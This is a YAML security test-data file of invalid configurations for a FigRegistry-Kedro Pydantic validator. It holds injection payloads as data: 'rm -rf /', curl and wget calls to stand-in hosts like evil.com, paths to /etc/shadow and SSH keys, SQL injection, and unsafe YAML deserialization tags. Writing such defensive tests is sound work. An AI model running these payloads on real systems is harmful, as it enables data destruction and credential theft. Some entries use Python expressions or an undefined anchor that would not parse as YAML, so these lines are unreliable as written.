# Invalid Parameter Combinations Security Test Data
# 
# This file contains deliberately invalid parameter combinations, type mismatches, 
# and constraint violations designed to test Pydantic schema validation robustness,
# parameter validation security, and type safety enforcement under malicious input 
# scenarios. All entries should fail validation and trigger appropriate error handling.
#
# Test Objectives:
# - Validate Pydantic schema robustness against malicious parameter combinations
# - Test comprehensive input validation and constraint enforcement under adversarial conditions  
# - Verify security boundary protection through parameter validation and type safety
# - Ensure proper error handling for injection attempts and validation bypass vectors

# =============================================================================
# TYPE SAFETY VIOLATION SCENARIOS
# =============================================================================

# Test Category: Basic Type Mismatches
type_confusion_attacks:
  description: "Basic type confusion attacks targeting core configuration fields"
  test_cases:
    # String fields with non-string types
    environment_type_confusion:
      config:
        environment: 12345  # Should be string
        styles:
          control:
            color: "#1f77b4"
      expected_error: "str_type"
      error_category: "type_validation"
      severity: "high"
    
    # Boolean fields with string injection
    boolean_string_injection:
      config:
        enable_concurrent_access: "True && rm -rf /"  # Should be boolean
        validation_enabled: "os.system('malicious')"  # Code injection attempt
        styles:
          control:
            color: "#1f77b4"
      expected_error: "bool_parsing"
      error_category: "type_validation"
      severity: "critical"
    
    # Dictionary fields with primitive types
    styles_type_replacement:
      config:
        styles: "malicious_string_instead_of_dict"
        palettes: 42
        outputs: ["array", "instead", "of", "dict"]
        defaults: null
      expected_error: "dict_type"
      error_category: "schema_violation"
      severity: "high"

# =============================================================================
# PARAMETER INJECTION AND VALIDATION BYPASS ATTEMPTS
# =============================================================================

# Test Category: Path Traversal and Injection Vectors
path_injection_attempts:
  description: "Parameter injection attempts through path manipulation and validation bypass"
  test_cases:
    # Output path traversal attempts
    output_path_traversal:
      config:
        outputs:
          base_path: "../../../etc/passwd"  # Path traversal attempt
          path_aliases:
            malicious: "../../../../root/.ssh/id_rsa"
            injection: "${env:HOME}/../../../etc/shadow"
          default_format: "png"
        styles:
          control:
            color: "#1f77b4"
      expected_error: "path_validation"
      error_category: "security_violation"
      severity: "critical"
    
    # Environment variable injection
    environment_variable_injection:
      config:
        outputs:
          base_path: "${PATH}:/malicious/path"
          timestamp_format: "${HOME}/malicious_{name}"
        kedro:
          debug_mode: "${MALICIOUS_ENV_VAR:-True}"
        styles:
          "${USER}_condition":  # Environment variable in condition name
            color: "#ff0000"
      expected_error: "environment_injection"
      error_category: "security_violation"
      severity: "critical"
    
    # Command injection through configuration values
    command_injection_attempts:
      config:
        outputs:
          base_path: "figures; rm -rf /tmp; mkdir"
          timestamp_format: "`curl malicious.com/steal`_{name}"
        defaults:
          font_family: "$(wget -O /tmp/malware http://evil.com/script.sh)"
        styles:
          control:
            label: "Control; system('malicious')"
      expected_error: "command_injection"
      error_category: "security_violation"
      severity: "critical"

# =============================================================================
# SCHEMA VIOLATION AND CONSTRAINT BYPASS SCENARIOS
# =============================================================================

# Test Category: Field Type Manipulation and Validation Constraint Bypass
schema_manipulation_attacks:
  description: "Schema violation scenarios with field type manipulation and validation constraint bypass"
  test_cases:
    # Numeric constraint violations
    numeric_boundary_exploitation:
      config:
        styles:
          control:
            color: "#1f77b4"
            linewidth: -999999999999999999999  # Extreme negative value
            markersize: 1.7976931348623157e+308  # Float overflow attempt
            alpha: 999.999  # Alpha out of range [0,1]
            zorder: "infinity"  # String instead of numeric
      expected_error: "numeric_constraints"
      error_category: "boundary_violation"
      severity: "medium"
    
    # String length and format violations
    string_format_exploitation:
      config:
        styles:
          # Extremely long condition name (potential buffer overflow)
          "a" * 10000:
            color: "#" + "f" * 1000  # Invalid color format
            marker: "invalid_marker_with_extremely_long_name_that_should_fail"
            linestyle: "\x00\x01\x02\x03"  # Control characters
            label: "\u202e\u202d"  # Unicode direction override (bidirectional attack)
      expected_error: "string_validation"
      error_category: "format_violation"
      severity: "medium"
    
    # Nested structure manipulation
    nested_structure_attacks:
      config:
        defaults:
          spine_visibility:
            top: "not_a_boolean"
            right: 123
            bottom: []
            left: {"nested": "attack"}
            # Additional unexpected fields
            malicious_field: "rm -rf /"
            __proto__: {"polluted": True}  # Prototype pollution attempt
        palettes:
          default: [1, 2, 3, "not_a_color", {"object": "in_array"}]
      expected_error: "nested_validation"
      error_category: "structure_violation"
      severity: "high"

# =============================================================================
# MALFORMED CONDITION MAPPINGS AND STYLE PARAMETER VIOLATIONS
# =============================================================================

# Test Category: Condition Parameter Security and Style Parameter Type Safety
condition_parameter_attacks:
  description: "Malformed condition mappings with invalid style parameters and type safety violations"
  test_cases:
    # Condition parameter injection
    condition_parameter_injection:
      config:
        styles:
          # Injection through condition names
          "control'; DROP TABLE users; --":
            color: "#1f77b4"
          "treatment || system('malware')":
            color: "#ff7f0e"
          # Code injection in condition patterns
          "exploratory_*; eval('malicious_code')":
            color: "#2ca02c"
          # Path traversal in condition
          "../../../etc/passwd":
            color: "#d62728"
      expected_error: "condition_injection"
      error_category: "parameter_injection"
      severity: "critical"
    
    # Style parameter type confusion
    style_parameter_confusion:
      config:
        styles:
          control:
            # Function injection attempts
            color: "eval('malicious_code')"
            marker: {"__class__": {"__base__": {"__subclasses__": "()"}}}
            linestyle: ["array", "instead", "of", "string"]
            linewidth: {"dict": "instead_of_number"}
            alpha: lambda x: x  # Function object (would be serialized)
            # Object reference attempts
            label: "__import__('os').system('rm -rf /')"
            zorder: float('inf')  # Infinity value
      expected_error: "style_type_confusion"
      error_category: "type_safety"
      severity: "critical"
    
    # Matplotlib parameter exploitation
    matplotlib_parameter_attacks:
      config:
        styles:
          control:
            # rcParams injection attempts
            "matplotlib.use": "Agg; import os; os.system('malicious')"
            "figure.figsize": "exec('malicious_code')"
            "savefig.directory": "/etc/passwd"
            # Invalid matplotlib parameters that might bypass validation
            color: "rgb(300, 300, 300)"  # Out of range RGB
            marker: "$\\mathtt{malicious}$"  # LaTeX injection attempt
            linestyle: (0, (1000000000, 1000000000))  # Extreme dash pattern
      expected_error: "matplotlib_injection"
      error_category: "parameter_exploitation"
      severity: "high"

# =============================================================================
# PARAMETER OVERFLOW AND MEMORY EXPLOITATION ATTEMPTS
# =============================================================================

# Test Category: Parameter Overflow and Boundary Condition Exploitation
overflow_exploitation_attempts:
  description: "Parameter overflow attempts and boundary condition exploitation vectors"
  test_cases:
    # Memory exhaustion through large parameters
    memory_exhaustion_attack:
      config:
        # Extremely large configuration structures
        styles:
          # Generate large number of conditions
          control: &large_style
            color: "#1f77b4"
            # Extremely large array to consume memory
            custom_data: !!python/object/apply:range [0, 1000000]
        # Repeat the large style many times
        palettes:
          massive_palette: !!python/object/apply:range [0, 100000]
        # Large string values
        metadata:
          description: !!python/object/apply:str ["x" * 1000000]
      expected_error: "memory_exhaustion"
      error_category: "resource_attack"
      severity: "high"
    
    # Integer overflow attempts
    integer_overflow_attacks:
      config:
        outputs:
          dpi: 18446744073709551615  # Max uint64
        styles:
          control:
            linewidth: 1.7976931348623157e+308  # Max float64
            markersize: -9223372036854775808  # Min int64
            alpha: 4.9406564584124654e-324  # Min positive float64
        defaults:
          font_size: 2147483647  # Max int32
          figure_size: [999999999999, 999999999999]
      expected_error: "integer_overflow"
      error_category: "boundary_attack"
      severity: "medium"
    
    # Unicode and encoding attacks
    unicode_exploitation_attempts:
      config:
        styles:
          # Unicode normalization attacks
          "café":  # Different Unicode representations
            color: "#1f77b4"
          "café":  # Visually identical but different encoding
            color: "#ff7f0e"
          # Zero-width characters
          "control\u200b\u200c\u200d":
            color: "#2ca02c"
          # RTL override attacks
          "\u202e\u202dcontrol":
            color: "#d62728"
          # Emoji and special characters
          "🔥💀☠️💣":
            color: "#9467bd"
            label: "\u0000null\u0001\u0002\u0003control"
      expected_error: "unicode_attack"
      error_category: "encoding_violation"
      severity: "medium"

# =============================================================================
# PYDANTIC VALIDATION BYPASS AND TYPE SAFETY CIRCUMVENTION
# =============================================================================

# Test Category: Type Safety Bypass and Validation Circumvention Attempts
validation_bypass_attempts:
  description: "Type safety bypass attempts through parameter manipulation and validation circumvention"
  test_cases:
    # Pydantic validator bypass attempts
    pydantic_bypass_attacks:
      config:
        # Attempt to bypass Field constraints
        environment: {"__pydantic_extra__": "malicious"}
        styles:
          control:
            # Attempt to use Pydantic private attributes
            __dict__: {"malicious": "injection"}
            __class__: "manipulation"
            __module__: "os"
            color: "#1f77b4"
        # Extra fields that should be validated
        __root__: "bypass_attempt"
        __config__: {"arbitrary_types_allowed": True}
      expected_error: "pydantic_bypass"
      error_category: "validation_bypass"
      severity: "critical"
    
    # Serialization/deserialization attacks
    serialization_attacks:
      config:
        styles:
          control:
            # Pickle injection attempts (if YAML allows)
            malicious_pickle: !!python/object/apply:os.system ["rm -rf /"]
            # Object creation attempts
            dangerous_object: !!python/object/new:subprocess.Popen
            - ["/bin/sh", "-c", "malicious command"]
        outputs:
          # YAML tag injection
          base_path: !!python/object/apply:__import__ ["os"]
      expected_error: "serialization_attack"
      error_category: "deserialization_vulnerability"
      severity: "critical"
    
    # Configuration hierarchy manipulation
    hierarchy_manipulation_attacks:
      config:
        # Attempt to override critical settings through nested paths
        kedro:
          config_overrides:
            styles:
              control:
                color: "override_attempt"
        # Nested reference attacks
        styles:
          control: &anchor
            color: "#1f77b4"
          malicious:
            <<: *anchor  # YAML anchor injection
            color: !!python/object/apply:eval ["'malicious_code'"]
        # Circular reference attempts
        circular:
          self_ref: *circular_ref
      expected_error: "hierarchy_manipulation"
      error_category: "reference_attack"
      severity: "high"

# =============================================================================
# COMPREHENSIVE PARAMETER VALIDATION BOUNDARY TESTING
# =============================================================================

# Test Category: Comprehensive Parameter Validation Testing for Security Boundary Enforcement
comprehensive_boundary_testing:
  description: "Comprehensive parameter validation testing scenarios for security boundary enforcement"
  test_cases:
    # Multi-vector attack combinations
    combined_attack_vectors:
      config:
        # Combine multiple attack types
        environment: "../../../etc/passwd && rm -rf /"
        enable_concurrent_access: "$(curl malicious.com)"
        styles:
          "'; DROP TABLE config; --":
            color: "rgb(-1, 300, 999)"
            marker: "__import__('os').system('malicious')"
            linewidth: 1.7976931348623157e+308
            alpha: -999
            label: "\u202e\u202dmalicious\u0000"
        outputs:
          base_path: "${HOME}/../../etc"
          timestamp_format: "`malicious_command`_{name}"
          path_aliases:
            evil: "../../../root/.ssh"
        kedro:
          debug_mode: "True; import subprocess; subprocess.call(['rm', '-rf', '/'])"
      expected_error: "multi_vector_attack"
      error_category: "comprehensive_attack"
      severity: "critical"
    
    # Edge case exploitation
    edge_case_exploitation:
      config:
        # Boundary values that might cause issues
        styles:
          "":  # Empty string key
            color: ""  # Empty color
          " ":  # Whitespace key
            color: " "  # Whitespace color
          "\n\t\r":  # Control characters key
            color: "\n#ff0000"  # Newline in color
          "null":
            color: null
          "undefined":
            color: undefined
          "NaN":
            linewidth: !!float "nan"
            alpha: !!float "inf"
        # Special YAML values
        defaults:
          font_size: !!null ""
          figure_size: !!python/none
        outputs:
          dpi: !!str "300"  # String instead of int
          base_path: !!bool false  # Boolean instead of string
      expected_error: "edge_case_exploitation"
      error_category: "boundary_testing"
      severity: "medium"
    
    # Recursive and self-referential attacks
    recursive_attacks:
      config:
        styles: &styles_ref
          control:
            color: "#1f77b4"
            nested: *styles_ref  # Self-reference
        palettes:
          recursive: &palette_ref
            - "#ff0000"
            - *palette_ref  # Recursive array
        # Deeply nested structure to test recursion limits
        deeply_nested:
          level1:
            level2:
              level3:
                level4:
                  level5:
                    level6:
                      level7:
                        level8:
                          level9:
                            level10:
                              malicious: "deep_injection"
      expected_error: "recursive_attack"
      error_category: "recursion_attack"
      severity: "high"

# =============================================================================
# METADATA AND DOCUMENTATION
# =============================================================================

# Test execution metadata
test_metadata:
  description: "Security test scenarios for FigRegistry-Kedro configuration validation"
  version: "1.0.0"
  created: "2024-01-01T00:00:00Z"
  test_categories:
    - "type_safety_violations"
    - "parameter_injection_attempts"
    - "schema_manipulation_attacks"
    - "condition_parameter_attacks"
    - "overflow_exploitation_attempts"
    - "validation_bypass_attempts"
    - "comprehensive_boundary_testing"
  
  severity_levels:
    critical: "Potential security vulnerabilities with high impact"
    high: "Significant validation failures or security concerns"
    medium: "Moderate validation issues or edge cases"
    low: "Minor validation inconsistencies"
  
  expected_behavior: |
    All configurations in this file should trigger appropriate Pydantic
    validation errors and be rejected by the FigRegistryConfigBridge and
    FigRegistryKedroConfig validation logic. No configuration should pass
    validation successfully. Each test case includes expected error types
    and categories for validation in security tests.
  
  security_objectives:
    - "Prevent code injection through configuration parameters"
    - "Ensure type safety across all configuration fields"
    - "Validate proper handling of malformed input data"
    - "Verify boundary condition enforcement"
    - "Test resilience against parameter manipulation attacks"
    - "Confirm proper error handling for invalid configurations"